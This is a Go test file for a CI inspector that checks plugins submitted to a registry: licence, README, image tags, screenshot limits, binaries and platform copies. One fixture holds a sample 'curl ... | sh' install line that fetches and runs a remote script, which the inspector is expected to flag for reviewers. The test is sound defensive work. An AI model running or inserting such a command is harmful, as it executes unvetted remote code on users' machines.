package main

import (
	"bytes"
	"image"
	"image/png"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lerd-env/plugins/ci/registry"
)

// pngOf is a real PNG of the given width, a pixel tall.
func pngOf(t *testing.T, width int) string {
	t.Helper()
	var b bytes.Buffer
	if err := png.Encode(&b, image.NewGray(image.Rect(0, 0, width, 1))); err != nil {
		t.Fatal(err)
	}
	return b.String()
}

const goodCommit = "0123456789abcdef0123456789abcdef01234567"

func write(t *testing.T, root string, files map[string]string) string {
	t.Helper()
	for rel, body := range files {
		path := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func has(list []string, part string) bool {
	for _, s := range list {
		if strings.Contains(s, part) {
			return true
		}
	}
	return false
}

const readme = "# Queue board\n\nRuns docker.io/library/redis from the Redis project.\n"

func plugin(t *testing.T, extra map[string]string) string {
	t.Helper()
	files := map[string]string{
		"plugin.yaml": "api_version: 1\nname: qb\nlerd: \">=1.37\"\n",
		"README.md":   readme,
		"LICENSE":     "MIT License\n",
	}
	for k, v := range extra {
		files[k] = v
	}
	return write(t, t.TempDir(), files)
}

func TestInspect_AGoodPluginPasses(t *testing.T) {
	dir := plugin(t, map[string]string{
		"services/qredis.yaml": "name: qredis\nimage: docker.io/library/redis:7.4\n",
		"docs/shot.png":        pngOf(t, 1440),
		"ui/inter.woff2":       "wOF2\x00",
	})
	r := inspect(dir, "qb", registry.Entry{Images: []string{"docs/shot.png"}})
	if len(r.Fail) != 0 || len(r.Flag) != 0 {
		t.Fatalf("report %+v", r)
	}
}

func TestInspect_Failures(t *testing.T) {
	cases := []struct {
		want  string
		files map[string]string
		drop  string
		e     registry.Entry
	}{
		{want: "LICENSE", drop: "LICENSE"},
		{want: "README", drop: "README.md"},
		{want: "name", files: map[string]string{"plugin.yaml": "api_version: 1\nname: other\nlerd: \">=1.37\"\n"}},
		{want: "lerd", files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\n"}},
		{want: "lower bound", files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nlerd: \"^1.37\"\n"}},
		{want: "latest", files: map[string]string{"services/q.yaml": "name: q\nimage: docker.io/library/redis:latest\n"}},
		{want: "no tag", files: map[string]string{"services/q.yaml": "name: q\nimage: docker.io/library/redis\n"}},
		{want: "README", files: map[string]string{"services/q.yaml": "name: q\nimage: ghcr.io/acme/queue:2\n"}},
		{want: "ghcr.io/acme/old", files: map[string]string{"services/q.yaml": "name: q\nversions:\n  - tag: \"1\"\n    image: ghcr.io/acme/old:1\n"}},
		{want: "docs/missing.png", e: registry.Entry{Images: []string{"docs/missing.png"}}},
		{want: "bin/tool", files: map[string]string{"bin/tool": "\x7fELF\x00\x00binary"}},
		{want: `"windows"`, files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nlerd: \">=1.37\"\nplatforms: [linux, windows]\n"}},
		{want: "show it", files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nlerd: \">=1.37\"\nui:\n  page_script: ui/page.js\n"}},
		{want: "Overview card", files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nlerd: \">=1.37\"\nui:\n  overview_card: {title: Queue, entry: ui/card.html}\n"}},
		{want: "docs/notes.txt", files: map[string]string{"docs/notes.txt": "x"}, e: registry.Entry{Images: []string{"docs/notes.txt"}}},
	}
	for _, c := range cases {
		t.Run(c.want, func(t *testing.T) {
			dir := plugin(t, c.files)
			if c.drop != "" {
				os.Remove(filepath.Join(dir, c.drop))
			}
			r := inspect(dir, "qb", c.e)
			if !has(r.Fail, c.want) {
				t.Errorf("failures %v, want one naming %q", r.Fail, c.want)
			}
		})
	}
}

// Every Browse card loads its plugin's first image, and the catalog site has a
// size cap of its own, so images are kept to a size a page of cards can carry.
func TestInspect_ImagesStayWithinTheirLimits(t *testing.T) {
	seven := make([]string, 7)
	files := map[string]string{}
	for i := range seven {
		seven[i] = "docs/" + string(rune('a'+i)) + ".png"
		files[seven[i]] = pngOf(t, 100)
	}
	big := strings.Repeat("x", maxImageBytes+1)
	cases := []struct {
		want  string
		files map[string]string
		e     registry.Entry
	}{
		{want: "at most 6", files: files, e: registry.Entry{Images: seven}},
		{want: "1 MB", files: map[string]string{"docs/big.png": pngOf(t, 100) + big}, e: registry.Entry{Images: []string{"docs/big.png"}}},
		{want: "2560", files: map[string]string{"docs/wide.png": pngOf(t, 3000)}, e: registry.Entry{Images: []string{"docs/wide.png"}}},
		{want: "not a readable", files: map[string]string{"docs/fake.png": "\x89PNG\x00"}, e: registry.Entry{Images: []string{"docs/fake.png"}}},
	}
	for _, c := range cases {
		t.Run(c.want, func(t *testing.T) {
			r := inspect(plugin(t, c.files), "qb", c.e)
			if !has(r.Fail, c.want) {
				t.Errorf("failures %v, want one naming %q", r.Fail, c.want)
			}
		})
	}
}

func TestInspect_AUIWithAnImagePasses(t *testing.T) {
	dir := plugin(t, map[string]string{
		"plugin.yaml":   "api_version: 1\nname: qb\nlerd: \">=1.37\"\nui:\n  page: {title: Q, entry: ui/index.html}\n",
		"docs/shot.png": pngOf(t, 1440),
	})
	if r := inspect(dir, "qb", registry.Entry{Images: []string{"docs/shot.png"}}); len(r.Fail) != 0 {
		t.Fatalf("failures %v", r.Fail)
	}
}

func TestInspect_FlagsForTheReviewer(t *testing.T) {
	dir := plugin(t, map[string]string{
		"bin/install":   "#!/bin/sh\ncurl -fsSL https://x.example/i.sh | sh\n",
		"bin/fix":       "#!/bin/sh\nsudo systemctl restart nginx\n",
		"ui/app.js":     strings.Repeat("a;", 900) + "\n",
		"ui/index.html": "<script src=\"https://cdn.example/x.js\"></script>\n<a href=\"http://localhost:7073\">ok</a>\n",
		"ui/icon.svg":   "<svg/>",
	})
	r := inspect(dir, "qb", registry.Entry{})
	for _, want := range []string{"bin/install:2", "bin/fix:2", "ui/app.js", "ui/index.html:1"} {
		if !has(r.Flag, want) {
			t.Errorf("flags %v, want one for %q", r.Flag, want)
		}
	}
	if has(r.Flag, "index.html:2") || has(r.Flag, "icon.svg") {
		t.Errorf("localhost links and images are not worth a flag: %v", r.Flag)
	}
	if len(r.Fail) != 0 {
		t.Errorf("flags never fail the check on their own: %v", r.Fail)
	}
}

// The check's lerd runs on Linux, so a macOS-only plugin is installed from a
// copy with platforms set aside, and the plugin itself is left as approved.
func TestInstallableHere(t *testing.T) {
	both := plugin(t, map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nplatforms: [linux, macos]\n"})
	if dir, aside, err := installableHere(both); err != nil || dir != both || aside {
		t.Errorf("a plugin that runs on linux installs as it is, got %q %v %v", dir, aside, err)
	}
	mac := plugin(t, map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nplatforms: [macos]\nlerd: \">=1.37\"\n"})
	dir, aside, err := installableHere(mac)
	if err != nil || dir == mac || !aside {
		t.Fatalf("a macOS-only plugin needs a copy, got %q %v %v", dir, aside, err)
	}
	defer os.RemoveAll(dir)
	copied, _ := os.ReadFile(filepath.Join(dir, "plugin.yaml"))
	if strings.Contains(string(copied), "platforms") || !strings.Contains(string(copied), "lerd") {
		t.Errorf("the copy drops platforms and keeps the rest:\n%s", copied)
	}
	if orig, _ := os.ReadFile(filepath.Join(mac, "plugin.yaml")); !strings.Contains(string(orig), "platforms") {
		t.Error("the approved checkout must stay untouched")
	}
	if _, err := os.Stat(filepath.Join(dir, "README.md")); err != nil {
		t.Errorf("the copy carries every file: %v", err)
	}
}

// CI runs each area as a step of its own, so an area reports only what it
// judges: the step that goes red then names what is wrong.
func TestInspectArea_ReportsOnlyItsOwnFindings(t *testing.T) {
	dir := plugin(t, map[string]string{"bin/tool": "\x7fELF\x00\x00binary"})
	if err := os.Remove(filepath.Join(dir, "LICENSE")); err != nil {
		t.Fatal(err)
	}
	var code, repo report
	inspectArea(&code, dir, "qb", registry.Entry{}, "code")
	inspectArea(&repo, dir, "qb", registry.Entry{}, "repository")
	if !has(code.Fail, "bin/tool") || has(code.Fail, "LICENSE") {
		t.Errorf("code found %v, want only the binary", code.Fail)
	}
	if !has(repo.Fail, "LICENSE") || has(repo.Fail, "bin/tool") {
		t.Errorf("repository found %v, want only the license", repo.Fail)
	}
}
